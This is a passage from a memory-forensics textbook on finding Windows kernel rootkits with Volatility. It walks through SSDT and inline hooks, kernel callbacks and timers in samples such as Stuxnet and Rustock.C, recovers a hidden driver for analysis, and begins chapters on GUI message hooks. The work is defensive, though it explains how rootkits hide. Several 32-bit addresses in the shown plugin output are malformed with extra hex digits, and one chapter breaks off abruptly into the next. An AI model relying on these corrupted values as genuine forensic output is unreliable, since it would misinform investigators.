The rootkit hooks four functions: `NtEnumerateValueKey` for hiding registry values, `NtOpenProcess` and `NtQuerySystemInformation` for hiding active processes, and `NtQueryDirectoryFile` for hiding files on disk. Despite the somewhat misleading name (`lanmandrv.sys` sounds like it could be a legitimate component), it stands out because it should not be handling APIs that are typically implemented by the NT module.

#### Inline Hooking

Attackers are well aware of the methods used to detect the modifications their tools make to systems. Thus, instead of pointing SSDT functions outside of the NT module or `win32ks.sys`, they can just use an inline hooking technique. This technique has the same effect of redirecting execution to a malicious function, but it is not as obvious. Here’s an example of how it appeared when the Skynet rootkit hooked `NtEnumerateKey` (we added the `--verbose` flag to check for these inline hooks):

```
$ python vol.py -f skynet.bin --profile=WinXPSP3x86 ssdt --verbose

[snip]

SSDT[0] at 804e26a8 with 284 entries
  Entry 0x0047: 0x80570d64 (NtEnumerateKey) owned by ntoskrnl.exe
  ** INLINE HOOK? => 0x820f1b3c (UNKNOWN)
  Entry 0x0048: 0x80648aeb (NtEnumerateSystem[snip]) owned by ntoskrnl.exe
  Entry 0x0049: 0x80590677 (NtEnumerateValueKey) owned by ntoskrnl.exe
  Entry 0x004a: 0x80625738 (NtExtendSection) owned by ntoskrnl.exe
  Entry 0x004b: 0x805b0b4e (NtFilterToken) owned by ntoskrnl.exe
  Entry 0x004c: 0x805899b4 (NtFindAtom) owned by ntoskrnl.exe
```

The pointer `0x80570d64` is indeed owned by `ntoskrnl.exe`, but the instructions at that address have been overwritten with a `JMP` that leads to `0x820f1b3c`. Thus, if you check only the initial owning module, you’ll miss the fact that this malware hooks the SSDT.

#### Table Duplication

Each thread on a 32-bit system has a `_ETHREAD.Tcb.ServiceTable` member that identifies the SSDT table it uses. Although this capability to assign call tables on a per-thread basis does not apply to 64-bit systems, what it essentially means is that each thread can be “looking” at a different SSDT, depending on the value of its `ServiceTable` member. In this case, malware could create a *copy* of the native function table, hook a few functions, and then update the `ServiceTable` value for a specific thread or all threads in a specific process to point at the new copy. As a result, many tools fail to report SSDT hooks because they check only the original table, not the copies.

Here’s an example of how the `ssdt` plugin’s output appears when analyzing a memory dump infected with Blackenergy. Only the relevant lines are shown:

```
$ python vol.py -f blackenergy.vmem --profile=WinXPSP3x86 ssdt

SSDT[0] at 814561b0 with 284 entries
  Entry 0x0115: 0x817315c1 (NtWriteVirtualMemory) owned by 00000B9D

SSDT[0] at 81882980 with 284 entries
  Entry 0x0115: 0x817315c1 (NtWriteVirtualMemory) owned by 00000B9D

SSDT[0] at 80501030 with 284 entries
  Entry 0x0115: 0x805a82f6 (NtWriteVirtualMemory) owned by ntoskrnl.exe
```

Note that there are three different instances of `SSDT[0]`, whereas a typical system has only one. You can tell that the table at `0x80501030` is the original clean copy because `NtWriteVirtualMemory` points to the NT module. However, both tables at `0x814561b0` and `0x81882980` are hooked—their versions of `NtWriteVirtualMemory` are pointing at a module named `00000B9D`.

### SSDT Hook Disadvantages

Hooking SSDT functions can provide a wide range of capabilities, but they can also be unstable. Here are a few reasons why malware authors might begin to use other techniques in the future:

- **Patchguard**: Hooking the SSDT is prevented on 64-bit systems due to Kernel Patch Protection (KPP), also known as Patchguard.
- **Multiple cores**: The system call tables are not a per-CPU structure. Thus, while one core is attempting to apply a hook, another core can be trying to call APIs.
- **Duplicate entries**: If third-party drivers are allowed to hook SSDT entries, multiple drivers might try to hook the same function. The consequences of drivers swapping out hooks can be unpredictable.
- **Undocumented APIs**: Many of the SSDT functions are undocumented by Microsoft and subject to change across versions of Windows. Thus, it can be difficult to write a portable rootkit that’s also reliable.

## Kernel Callbacks

Kernel callbacks, or notification routines, are the new API hooks. They solve many of the previously described issues regarding SSDT hooks. In particular, they’re documented, supported on 64-bit systems, and safe for multicore machines; and it is perfectly fine for multiple modules to register for the same type of event. The following list describes the various types of events that Volatility’s `callbacks` plugin detects:

- **Process creation**: These callbacks are installed with the `PsSetCreateProcessNotifyRoutine` API and they’re relied upon by the Process Monitor utility from SysInternals, various antivirus products, and many rootkits. They’re triggered when a process starts or exits.
- **Thread creation**: These callbacks are installed with the `PsSetCreateThreadNotifyRoutine` API. They’re triggered when a thread starts or exits.
- **Image load**: These callbacks are installed with the `PsSetLoadImageNotifyRoutine` API. The purpose of these callbacks is to provide notifications when any executable image is mapped into memory, such as a process, library, or kernel module.
- **System shutdown**: These callbacks are installed with the `IoRegisterShutdownNotification` API. In this case, the target driver’s `IRP_MJ_SHUTDOWN` handler is invoked when the system is about to be powered off.
- **File system registration**: To receive notification when a new file system becomes available, use the `IoRegisterFsRegistrationChange` API.
- **Debug message**: To capture debug messages emitted by kernel modules, use the `DbgSetDebugPrintCallback` API.
- **Registry modification**: Drivers can call `CmRegisterCallback` (Windows XP and 2003) or `CmRegisterCallbackEx` (Windows Vista and later) to receive notification when any thread performs an operation on the registry.
- **PnP (Plug and Play)**: These callbacks are installed with the `IoRegisterPlugPlayNotification` API and they trigger when PnP devices are introduced, removed, or changed.
- **Bugchecks**: These callbacks are installed with the `KeRegisterBugCheckCallback` or `KeRegisterBugCheckReasonCallback` API, functions. They allow drivers to receive notification when a bug check (unhandled exception) occurs, thus providing the opportunity to reset device configurations or add device-specific state information to a crash dump file (before a Blue Screen of Death [BSoD], for example).

### Callbacks in Memory

The following example shows the `callbacks` plugin on a clean Windows 7 64-bit system. Although the output is truncated for brevity, there were about 80 callbacks of different types installed on this system. The `Callback` column tells you the address of the function that is invoked when the event of interest occurs. The `Module` column tells you the name of the kernel module that occupies the memory for the callback function. Depending on the type of callback, you might also see the name of the driver object or a description of the component that installed the callback.

```
$ python vol.py -f memory.dmp --profile=Win7SP1x64 callbacks
Volatility Foundation Volatility Framework 2.4 
Type                                 Callback           Module         Details
------------------------------------ ------------------ -------------- -------
GenericKernelCallback                0xfffff88002922d2c peauth.sys     -
EventCategoryTargetDeviceChange      0xfffff96000221304 win32k.sys     Win32k
[snip]
EventCategoryDeviceInterfaceChange   0xfffff88000db99b0 partmgr.sys    partmgr
EventCategoryTargetDeviceChange      0xfffff800029ef180 ntoskrnl.exe   ACPI
GenericKernelCallback                0xfffff800028a6af0 ntoskrnl.exe   -
IoRegisterShutdow[snip]              0xfffff88001434b04 VIDEOPRT.SYS   \Driver\RDPREFMP
IoRegisterShutdow[snip]              0xfffff88001434b04 VIDEOPRT.SYS   \Driver\RDPCDD
IoRegisterShutdow[snip]              0xfffff88000dd0c40 volmgr.sys     \Driver\volmgr
[snip]
IoRegisterShutdownNotification       0xfffff80002cd0f70 ntoskrnl.exe   \FileSystem\RAW
PsRemoveLoadImageNotifyRoutine       0xfffff80002bf7cc0 ntoskrnl.exe   -
KeBugCheckCallbackListHead           0xfffff88001494b00 ndis.sys       Ndis min
KeBugCheckCallbackListHead           0xfffff88001494b00 ndis.sys       Ndis min
```

### Malicious Callbacks

Many high-profile rootkits such as Mebroot, ZeroAccess, Rustock, Ascesso, Tigger, Stuxnet, Blackenergy, and TDL3 leverage kernel callbacks. In most cases, they also try to hide by unlinking the `KLDR_DATA_TABLE_ENTRY` or by running as an orphan thread from a kernel pool. This behavior makes the malicious callbacks easy to spot because the `Module` column in the output of Volatility’s `callbacks` plugin displays `UNKNOWN`. In other cases, malware authors don’t hide their module at all, but they use a hard-coded (and thus predictable) name with which you can build indicators of compromise (IOCs).

The first example is from Stuxnet. It loads two modules: `mrxnet.sys` and `mrxcls.sys`. The first one installs a file system registration change callback to receive notification when new file systems become available (so it can immediately spread or hide files). The second one installs an image load callback, which it uses to inject code into processes when they try to load other dynamic link libraries (DLLs).

```
$ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 callbacks
Volatility Foundation Volatility Framework 2.4
Type                                 Callback   Module               Details
------------------------------------ ---------- -------------------- -------
IoRegisterFsRegistrationChange       0xf84be876 sr.sys               -
IoRegisterFsRegistrationChange       0xb21d89ec mrxnet.sys           -
IoRegisterFsRegistrationChange       0xf84d54b8 fltMgr.sys           -
[snip]
KeRegisterBugCheckReasonCallback     0xf8b7aab8 mssmbios.sys         SMBiosDa
KeRegisterBugCheckReasonCallback     0xf8b7aa28 mssmbios.sys         SMBiosDa
KeRegisterBugCheckReasonCallback     0xf82e01be USBPORT.SYS          USBPORT
KeRegisterBugCheckReasonCallback     0xf82c75f022 VIDEOPRT.SYS         Videoprt
PsSetLoadImageNotifyRoutine          0xb240ce4c PROCMON20.SYS        -
PsSetLoadImageNotifyRoutine          0x805f81a6 ntoskrnl.exe         -
PsSetLoadImageNotifyRoutine          0xf895ad06 mrxcls.sys           -
PsSetCreateThreadNotifyRoutine       0xb240cc9a PROCMON20.SYS        -
PsSetCreateProcessNotifyRoutine      0xf87ad194 vmci.sys             -
PsSetCreateProcessNotifyRoutine      0xb240cb94 PROCMON20.SYS        - 
```

The next example is from Rustock.C. It registers a bug check callback so that it can clean its memory before a crash dump is created (see Frank Boldewin’s report here: [http://www.reconstructer.org/papers/Rustock.C%20-%20When%20a%20myth%20comes%20true.pdf](http://www.reconstructer.org/papers/Rustock.C%20-%20When%20a%20myth%20comes%20true.pdf)). The only reason why you see its artifacts here in the memory dump is because the memory was acquired in raw format instead.

```
$ python vol.py -f rustock-c.mem --profile=WinXPSP3x86 callbacks
Volatility Foundation Volatility Framework 2.4
Type                                 Callback   Module               Details
------------------------------------ ---------- -------------------- -------
IoRegisterFsRegistrationChange       0xf84be876 sr.sys               -
KeBugCheckCallbackListHead           0x81f53964 UNKNOWN              -
[snip]
GenericKernelCallback                0xf887b6ae vmdebug.sys          -
KeRegisterBugCheckReasonCallback     0xf8b5aac0 mssmbios.sys         SMBiosDa
KeRegisterBugCheckReasonCallback     0xf8b5aa78 mssmbios.sys         SMBiosRe
KeRegisterBugCheckReasonCallback     0xf8b5aa30 mssmbios.sys         SMBiosDa
KeRegisterBugCheckReasonCallback     0xf82d93e2 VIDEOPRT.SYS         Videoprt
KeRegisterBugCheckReasonCallback     0xf8311006 USBPORT.SYS          USBPORT
KeRegisterBugCheckReasonCallback     0xc83f010f66 USBPORT.SYS          USBPORT
PsSetCreateProcessNotifyRoutine      0xf887b6ae vmdebug.sys          -
```

Here’s an example that shows the registry change callback installed by Ascesso. The rootkit uses this functionality to watch over its persistence keys in the registry, and adds them back if an administrator or antivirus software removes them.

```
$ python vol.py -f ascesso.vmem --profile=WinXPSP3x86 callbacks
Volatility Foundation Volatility Framework 2.4
Type                                 Callback   Module               Details
------------------------------------ ---------- -------------------- -------
IoRegisterFsRegistrationChange       0xf84be876 sr.sys               -
IoRegisterFsRegistrationChange       0xb2838900 LiveKdD.SYS          -
[snip]
GenericKernelCallback                0xf888d194 vmci.sys             -
GenericKernelCallback                0x8216628f UNKNOWN              -
GenericKernelCallback                0x8216628f UNKNOWN              -
KeRegisterBugCheckReasonCallback     0xf8b82ab8 mssmbios.sys         SMBiosDa
KeRegisterBugCheckReasonCallback     0xf8b82a70 mssmbios.sys         SMBiosRe
KeRegisterBugCheckReasonCallback     0xf7c61f011e USBPORT.SYS          USBPORT
KeRegisterBugCheckReasonCallback     0xf7f78522 VIDEOPRT.SYS         Videoprt
PsSetCreateProcessNotifyRoutine      0xf888d194 vmci.sys             -
CmRegisterCallback                   0x8216628f UNKNOWN              -
```

The Blackenergy rootkit installs a thread creation callback, so that it can immediately replace the `_ETHREAD.Tcb.ServiceTable` pointer on all threads that start on the system. As discussed in the section “Table Duplication” of this chapter, on 32-bit systems, the `ServiceTable` member points to the system call table in which the addresses of all kernel-mode APIs are found.

```
$ python vol.py -f blackenergy.vmem --profile=WinXPSP3x86 callbacks
Volatility Foundation Volatility Framework 2.4 
Type                              Callback   Module         Details
--------------------------------- ---------- -------------- -------
IoRegisterShutdownNotification    0xf9eae5be Fs_Rec.SYS     \FileSystem\Fs_Rec
[snip]
IoRegisterShutdownNotification    0x805c46f030 ntoskrnl.exe   \Driver\WMIxWDM
IoRegisterFsRegistrationChange    0xf97d9876 sr.sys         -
GenericKernelCallback             0xf9abec72 vmci.sys       -
PsSetCreateThreadNotifyRoutine    0x81731ea7 00000B9D       -
PsSetCreateProcessNotifyRoutine   0xf9abec72 vmci.sys       -
KeBugCheckCallbackListHead        0xf97015ed NDIS.sys       Ndis miniport
KeBugCheckCallbackListHead        0x806d57ca hal.dll        ACPI 1.0 - APIC 
KeRegisterBugCheckReasonCallback  0xf9e68ac0 mssmbios.sys   SMBiosDa
KeRegisterBugCheckReasonCallback  0xf9e68a78 mssmbios.sys   SMBiosRe
```

Finding and analyzing callbacks is a critical component of kernel memory forensics. Surprisingly, there are no system administration tools and very few anti-rootkit tools for live systems that analyze kernel callbacks (RkU – Rootkit Unhooker is one of them). In fact, Microsoft’s own debugger doesn’t have the capability by default. However, Scott Noone ([http://analyze-v.com/?p=746](http://analyze-v.com/?p=746)) and Matthieu Suiche ([http://www.moonsols.com/2011/02/17/global-windows-callbacks-and-windbg/](http://www.moonsols.com/2011/02/17/global-windows-callbacks-and-windbg/)) have published scripts to help fill that void.

## Kernel Timers

Most often, malware uses timers for synchronization and notification. A rootkit driver can create a timer (usually by calling `KeInitializeTimer`) to receive notification when a given time elapses. If you think this is similar to just calling `Sleep`, you’re right. However, calling Sleep puts a thread to sleep and prevents it from performing other actions while it waits, unlike notifications based on timers. Also, `Sleep` doesn’t create any additional forensic artifacts. You can also create timers that reset after expiring. In other words, instead of just being notified once, a thread can be notified on a periodic basis. Maybe the rootkit wants to check whether a DNS host name resolves every five minutes, or to poll a given registry key for changes every two seconds. Timers are great for these types of tasks.

When drivers create timers, they can supply a DPC routine—otherwise known as a deferred procedure call. When the timer expires, the system calls the specified procedure. The address of the procedure or function is stored in the `_KTIMER` structure, along with information on when (and how often) to execute the procedure. And now you see why kernel timers are such useful artifacts for memory forensics. Rootkits load drivers in kernel memory and try hard to stay undetected. But their use of timers gives you a clear indicator of where the rootkit is hiding in memory. All you need to do is find the timer objects.

### Finding Timer Objects

Over the years, Microsoft has changed how and where timers are stored in memory. In Windows 2000, for example, the `nt!KiTimerTableListHead` symbol pointed to an array of 128 `_LIST_ENTRY` structures for `_KTIMER`. The array size later changed to 256 and then again to 512, until finally the `nt!KiTimerTableListHead` symbol was removed completely in Windows 7. Nowadays, you can find the timer objects by way of each CPU’s control region (`_KPCR`) structure. For more information on these changes, see *Ain’t Nuthin But a K(Timer) Thing, Baby*: [http://mnin.blogspot.com/2011/10/aint-nuthin-butktimerthing-baby.html](http://mnin.blogspot.com/2011/10/aint-nuthin-butktimerthing-baby.html).

### Malware Analysis with Timers

The following example shows how to investigate the ZeroAccess rootkit using the `timers` plugin. The rootkit employed various anti-forensic techniques to prevent its module from being easily detected, but as a result, a timer points into an unknown region of kernel memory.

```
$ python vol.py -f zeroaccess2.vmem timers
Volatility Foundation Volatility Framework 2.1_alpha
Offset       DueTime              Period(ms) Signaled  Routine     Module
0x805598e0   0x00000084:0xce8b961c 1000      Yes       0x80523dee  ntoskrnl.exe
0x820a1e08   0x00000084:0xdf3c0c1c 30000     Yes       0xb2d2a385  afd.sys
0x81ebf0b8   0x00000084:0xce951f84 0         -         0xf89c23f0  TDI.SYS
[snip]
0x81dbeb78   0x00000131:0x2e896402 0         -         0xf83faf6f  NDIS.sys
0x81e8b4f0   0x00000131:0x2e896402 0         -         0xf83faf6f  NDIS.sys
0x81eb8e28   0x00000084:0xc58e055f6a 0         -         0x80534e48  ntoskrnl.exe
0xb20bbbb0   0x00000084:0xd4de72d2 60000     Yes       0xb20b5990  UNKNOWN
0x8210d910   0x80000000:0x0a7efa36 0         -         0x80534e48  ntoskrnl.exe
0x82274190   0x80000000:0x711befba 0         -         0x80534e48  ntoskrnl.exe
0x81dc96e090   0x80000000:0x0d0c3e8a 0         -         0x80534e48  ntoskrnl.exe
```

---

**NOTE**

*Timers and times* by Andreas Schuster ([http://computer.forensikblog.de/en/2011/10/timers-and-times.html](http://computer.forensikblog.de/en/2011/10/timers-and-times.html)) shows how to convert the `DueTime` field into human readable values using WinDbg.

---

Additionally, the same Rustock.C variant that you analyzed in the “Malicious Callbacks” section installed several timers. It also attempts to hide its kernel module, thus leaving traces of suspicious activity easily visible with the `timers` plugin.

```
$ python volatility.py timers -f rustock-c.vmem 
Volatility Foundation Volatility Framework 1.4_rc1
Offset       DueTime               Period(ms) Signaled  Routine     Module
0xf730a790   0x00000000:0x6db0f0b4 0          -         0xf72fb385  srv.sys
0x80558a40   0x00000000:0x68f10168 1000       Yes       0x80523026  ntoskrnl.exe
0x80559160   0x00000000:0x695c4b3a 0          -         0x80526bac  ntoskrnl.exe
0x820822e4   0x00000000:0xa2a56bb0 150000     Yes       0x81c1642f  UNKNOWN
0xf842f150   0x00000000:0xb5cb4e80 0          -         0xc84f147e  Ntfs.sys
0xf70d00e0   0x00000000:0x81eb644c 0          -         0xf70c18de  HTTP.sys
0xf70cd808   0x00000000:0x81eb644c 60000      Yes       0xf70b6202  HTTP.sys
0x81e57fb0   0x00000000:0x6a4f7b16 30000      Yes       0xf7b62385  afd.sys
0x81f5f8d4   0x00000000:0x6a517bc8 3435       Yes       0x81c1642f  UNKNOWN
[snip]
```

As stated in the previous analysis, although you don’t know the name of the malicious module in these cases, you at least have pointers to where the rootkit code exists in kernel memory. You can then disassemble it with `volshell` or extract the code to a separate file for static analysis in IDA Pro or other frameworks.

---

**NOTE**

On 64-bit platforms, one of the Patchguard-related features results in the DPC address being encoded. The operating system (OS) decodes them at run time using a similar algorithm described in *The Secret to Windows 8 and 2012 Raw Memory Dump Forensics*: [http://volatility-labs.blogspot.com/2014/01/the-secret-to-64-bit-windows-8-and-2012.html](http://volatility-labs.blogspot.com/2014/01/the-secret-to-64-bit-windows-8-and-2012.html). Volatility takes this into account and can perform the same on-the-fly decryption of the DPC address.

---

## Putting It All Together

Now that you’ve been exposed to the various methods of finding and analyzing malicious code in the kernel, we’ll show you an example of how to put all the pieces together. In this case, we first noticed the rootkit’s presence due to its timers and callbacks that point into memory that isn’t owned by a module in the loaded module list. Here is the relevant output from those two plugins:

```
$ python vol.py -f spark.mem --profile=WinXPSP3x86 timers
Volatility Foundation Volatility Framework 2.4
Offset(V)  DueTime                  Period(ms) Signaled  Routine    Module
---------- ------------------------ ---------- --------  ---------- ------
0x8055b200 0x00000086:0x1c631c38             0 -         0x80534a2a ntoskrnl.exe
0x805516d0 0x00000083:0xe04693bc         60000 Yes       0x804f3eae ntoskrnl.exe
0x81dc52a0 0x00000083:0xe2d175b6         60000 Yes       0xf83fb6bc NDIS.sys
0x81eb8e28 0x00000083:0xd94cd26a             0 -         0x80534e48 ntoskrnl.exe
[snip]
0x80550ce0 0x00000083:0xc731f6fa             0 -         0x8053b8fc ntoskrnl.exe
0x81b9f790 0x00000084:0x290c9ad8         60000 -         0x81b99db0 UNKNOWN
0x822771a0 0x00000131:0x2c87e001a8             0 -         0xf83faf6f NDIS.sys

$ python vol.py -f spark.mem --profile=WinXPSP3x86 callbacks
Volatility Foundation Volatility Framework 2.4
Type                              Callback   Module      Details
--------------------------------- ---------- ----------- -------
IoRegisterFsRegistrationChange    0xf84be876 sr.sys      -
KeBugCheckCallbackListHead        0xf83e65ef NDIS.sys    Ndis miniport
KeBugCheckCallbackListHead        0x806d77cc hal.dll     ACPI 1.0 - APIC 
IoRegisterShutdownNotification    0x81b934e0 UNKNOWN     \Driver\03621276
IoRegisterShutdownNotification    0xf88ddc74 Cdfs.SYS    \FileSystem\Cdfs
[snip]
PsSetCreateProcessNotifyRoutine   0xf87ad194 vmci.sys    -
CmRegisterCallback                0x81b92d60 UNKNOWN     -
```

A procedure at `0x81b99db0` is set to execute every 60,000 milliseconds, a function at `0x81b934e0` is set to call when the system shuts down, and a function at `0x81b92d60` gets notified of all registry operations. This rootkit has clearly “planted some seeds” into the kernel of this victim system. At this point, you don’t know the name of its module, but you can see that the shutdown callback is associated with a driver named `\Driver\03621276`. Given that information, you can seek more details with the `driverscan` plugin:

```
$ python vol.py -f spark.mem --profile=WinXPSP3x86 driverscan
Volatility Foundation Volatility Framework 2.4
Offset(P)  #Ptr Start          Size Service Key       Driver Name
---------- ---- ---------- -------- ----------------- -----------
0x01e109b8    1 0x00000000      0x0 \Driver\03621276  \Driver\03621276
0x0214f4c8    1 0x00000000      0x0 \Driver\03621275  \Driver\03621275
[snip]
```

According to this output, the starting address for the kernel module that created the suspect driver object is zero. It could be an anti-forensics technique to prevent analysts from dumping the malicious code. Indeed, it is working so far because to extract the module, you either need the module’s name or base address, and you already know that the name is not available. However, there are various pointers inside the malicious module’s code; you just need to find out where the PE file starts. You can do this with a little scripting inside `volshell`, using one of the following techniques:

- Take one of the addresses and scan backward looking for a valid MZ signature. If the malicious PE file has several other binaries embedded, the first result might not be the right one.
- Set your starting address somewhere between 20KB and 1MB behind the lowest pointer that you have; then walk forward looking for a valid MZ signature.

The following code shows how to perform the second method:

```
$ python vol.py -f spark.mem volshell

[snip]

>>> start = 0x81b99db0 - 0x100000
>>> end = 0x81b93690 
>>> while start < end:
...   if addrspace().zread(start, 4) == "MZ\x90\x00":
...     print hex(start)
...     break
...   start += 1
... 
0x81b91b80
```

---

**NOTE**

Alternatively, you can translate the virtual address into a physical offset by calling the `addrspace().vtop(ADDR)` function. Provided you have a raw, padded memory dump, you can open it in a hex editor and seek to the physical offset—then scroll up to find the MZ signature.

---

You found an MZ signature at `0x81b91b80`, which is about 8KB above the timers and callbacks procedures. You can also verify the PE header in `volshell`:

```
>>> db(0x81b91b80)
0x81b91b80  4d5a 9000 0300 0000 0400 0000 ffff 0000   MZ..............
0x81b91b90  b800 0000 0000 0000 4000 0000 0000 0000   ........@.......
0x81b91ba0  0000 0000 0000 0000 0000 0000 0000 0000   ................
0x81b91bb0  0000 0000 0000 0000 0000 0000 d000 0000   ................
0x81b91bc0  0e1f ba0e 00b4 09cd 21b8 014c cd21 5468   ........!..L.!Th
0x81b91bd0  6973 2070 726f 6772 616d 2063 616e 6e6f   is.program.canno
0x81b91be0  7420 6265 2072 756e 2069 6e20 444f 5320   t.be.run.in.DOS.
0x81b91bf0  6d6f 6465 2e0d 0d0a 2400 0000 0000 0000   mode....$.......
```

Finally, you can now supply a base address to the `moddump` plugin and extract the module from memory:

```
$ python vol.py -f spark.mem moddump -b 0x81b91b80 --dump-dir=OUTPUT
      --profile=WinXPSP3x86
Volatility Foundation Volatility Framework 2.4
Module Base Module Name          Result
----------- -------------------- ------
0x081b91b80 UNKNOWN              OK: driver.81b91b80.sys
```

You have to fix the `ImageBase` value in the PE header to match where you found it:

```
$ python
Python 2.7.6 (v2.7.6:3a1db0d2747e, Nov 10 2013, 00:42:54) 
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import pefile
>>> pe = pefile.PE("driver.81b91b80.sys")
>>> pe.OPTIONAL_HEADER.ImageBase = 0x81b91b80
>>> pe.write("driver.81b91b80.sys")
>>> quit()
```

The last thing you have to do before loading the file in IDA Pro is to generate labels for the API functions. Typically, IDA can parse the import address table and show API names properly, but it doesn’t expect to receive files dumped from memory after the import address table (IAT) is already patched. In these cases, you can run the `impscan` plugin with the base address of the suspect module and the command-line argument for the `idc` output format like this:

```
$ python vol.py -f spark.mem impscan --base=0x81b91b80 --output=idc
      --profile=WinXPSP3x86
Volatility Foundation Volatility Framework 2.4

MakeDword(0x81B9CB90);
MakeName(0x81B9CB90, "PsGetVersion");
MakeDword(0x81B9CB94);
MakeName(0x81B9CB94, "PsGetProcessImageFileName");
MakeDword(0x81B9CB98);
MakeName(0x81B9CB98, "ExAllocatePool");
MakeDword(0x81B9CB9C);
MakeName(0x81B9CB9C, "ZwWriteFile");
MakeDword(0x81B9CBA0);
MakeName(0x81B9CBA0, "ExFreePoolWithTag");
MakeDword(0x81B9CBA4);
MakeName(0x81B9CBA4, "ZwQueryInformationThread");
[snip]
```

With the dumped module open in IDA Pro, go to the File ⇒ Script Command and paste the output from the `impscan` plugin into the window. After following these steps, you should have a properly rebuilt binary, with accurate string references and API function names, as shown in [Figure 13-9](#figure13-9).

![c13f009.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c13/c13f009.png)

*[**Figure 13-9:**](#figureanchor13-9) A kernel module loaded in IDA Pro after dumping it from memory and fixing its base address and imports*

Depending on your goals, you might not always need to go this deep. We typically try to determine as much as possible about a rootkit’s behavior based on the artifacts that it leaves in the memory dump. However, some circumstances require reverse engineering to fully understand the code—and that can’t be avoided. Now you know how to approach those situations by combining memory forensics with static analysis tools.

---

**NOTE**

Just a few months after taking our training course, one of our past students very capably analyzed the Uroburos rootkit in memory. You can read the analysis here: [http://spresec.blogspot.com/2014/03/uroburos-rootkit-hook-analysis-and.html](http://spresec.blogspot.com/2014/03/uroburos-rootkit-hook-analysis-and.html)

---

## Summary

Kernel land is a fascinating but broad aspect of memory analysis. There are countless ways to hide code in the kernel, alter operating system behaviors, and so on. Furthermore, many analysts are unfamiliar with the territory, which decreases their evidence-hunting capabilities. However, now you’ve been exposed to the most common methods as well as seen practical examples of detecting high-profile rootkits using memory forensics software. In general, malware that operates in the kernel remains in memory so that it can stay functional. Often, a functional requirement involves modifying a call table, installing a callback, or creating a new thread—all operations that leave artifacts for you to recover like a trail of breadcrumbs. Once you find the memory range(s) occupied by the malicious code and extract it, the rest is history!
# Chapter 14 Windows GUI Subsystem, Part I

The Windows graphical user interface (GUI) subsystem is responsible for managing user input, such as mouse movements and keystrokes. In addition, it draws the display surface; presents windows, buttons, and menus; and provides the necessary isolation to support multiple concurrent users logged in via the console, RDP, and Fast-User Switching. The GUI subsystem plays a huge role in everyday computer use, and it is inevitable that malware and attackers unknowingly modify GUI memory during the course of their actions. Unfortunately, there are few tools, much less forensic tools, capable of analyzing and reporting on artifacts created in and maintained by this subsystem.

The next two chapters introduce a collection of data structures, classes, algorithms, APIs, and plugins for extracting GUI-related evidence from physical memory (RAM) of 32- and 64-bit Windows XP, Server 2003, Vista, Server 2008, and Windows 7. We will be discussing various specific examples of how malicious code can be detected in memory and how you can apply knowledge of the GUI internals to forensic investigations.

## The GUI Landscape

The GUI subsystem is composed of various objects that all work together to provide an enhanced user experience. The relationship of these components is summarized in [Figure 14-1](#figure14-1). The diagram does not capture all the GUI internals—only the most important ones for forensics and malware investigations.

*[**Figure 14-1:**](#figureanchor14-1) Windows GUI landscape*
# Chapter 15  
 Windows GUI Subsystem, Part II

Part II of the Windows graphical user interface (GUI) subsystem analysis covers detection of message and event hooks, inspection of the `USER` object handle tables, extraction of data from the Windows clipboard, and various additional topics. You will also read through some in-depth case studies that leverage memory forensics and highlight the unique ability of the Volatility Framework to detect malicious code in RAM.

## Window Message Hooks

Applications can place hooks into the Windows GUI subsystem to customize the user experience, receive notification when certain actions take place, or record everything the user does—for example, to create a computer-based training (CBT) video. As you probably expected, this type of access and control is often exploited by malware to capture keystrokes, inject malicious dynamic link libraries (DLLs) into trusted processes, and perform other nefarious actions.

When a user presses a key, the system generates a `WM_KEYDOWN` message and delivers it (along with additional information, such as the exact key, whether `SHIFT` was down at the time, etc.) to the target window’s queue. The target window is usually the foreground window (in focus). When the message hits the queue, the thread that owns the window wakes up and processes the message—which could mean appending the typed character into a text edit field, taking some special action if the key is a “hot key,” or even just ignoring it. [Figure 15-1](#figure15-1) shows a very simplified diagram of a nonhooked messaging system.

![c15f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f001.png)

*[**Figure 15-1:**](#figureanchor15-1) A nonhooked window messaging system*

Message hooks can intercept the window messages before they reach the target window procedure. For example, attackers can spy on all keyboard-related messages, including `WM_KEYDOWN`, in order to log them, and then either pass them on to the intended application or prevent them from ever reaching the right place. This is one of the oldest and most effective ways to log keystrokes on Windows-based systems.

[Figure 15-2](#figure15-2) shows how the messaging system works when hooks are installed. When a message is generated, the DLL containing the hook procedure is mapped into to the address space of the specified thread(s) if it is not already loaded. The message is passed to the hook procedure, which handles it as desired; finally, if allowed, the message reaches the target window procedure for normal processing.

![c15f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f002.png)

*[**Figure 15-2:**](#figureanchor15-2) Malware can hook into the messaging system.*

### Message Hook Installation

Adversaries can use the `SetWindowsHookEx` function to install message hooks. The function prototype follows:

```
HHOOK WINAPI SetWindowsHookEx(
  _In_  int idHook,
  _In_  HOOKPROC lpfn,
  _In_  HINSTANCE hMod,
  _In_  DWORD dwThreadId
);
```

Here are descriptions for the parameters:

- `idHook` is one of the `WH_` constants, such as `WH_KEYBOARD` or `WH_MOUSE`. It specifies what types of messages should be monitored.
- `lpfn` is the address of a hook procedure that handles the message before the target window. This procedure is a function of type `HOOKPROC`, which receives the message, processes it, and optionally passes it to the next hook in the chain (or the target window if there are no other hooks) with `CallNextHookEx`.
- `hMod` is a handle for the DLL that contains the hook procedure. This DLL loads into the address space of the thread that owns the target window.
- `dwThreadId` is a thread ID (i.e., scope) for the hook. It can be a specific thread ID or 0 to affect all threads in the current desktop.

In almost all cases, malicious message hooks are global in scope. So during analysis, you will want to focus on global hooks and attempt to reconstruct the original parameters passed to `SetWindowsHookEx` so you can determine the offending DLL and hook function.

---

## **Analysis Objectives**

Your objectives are these:

- **Detect global hooks**: Determine whether any global (affecting all threads in the desktop) message hooks are installed.
- **DLL attribution**: Trace the hook function back to its owning DLL on disk.
- **Hook function analysis**: Analyze the hook function code to understand what UI interactions (keystrokes, mouse movements, etc.) are being monitored.

## **Data Structures**

The message hook structure is `tagHOOK`. An example from Windows 7 x64 follows:

```
>>> dt("tagHOOK")
'tagHOOK' (96 bytes)
0x0   : head                           ['_THRDESKHEAD']
0x28  : phkNext                        ['pointer64', ['tagHOOK']]
0x30  : iHook                          ['long']
0x38  : offPfn                         ['unsigned long long']
0x40  : flags                          ['Flags', {'bitmap': {'HF_INCHECKWHF': 8, 
